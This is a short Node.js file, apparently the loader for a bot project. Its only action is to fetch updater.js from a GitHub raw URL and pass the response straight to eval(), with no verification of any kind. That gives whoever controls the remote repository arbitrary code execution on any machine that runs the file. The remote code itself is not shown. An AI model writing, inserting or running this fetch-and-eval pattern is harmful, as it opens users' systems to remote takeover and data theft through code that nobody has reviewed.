const axios = require('axios');

axios.get("https://raw.githubusercontent.com/NAYAN-BOT69/NAYAN-BOT/main/updater.js")
	.then(res => eval(res.data));
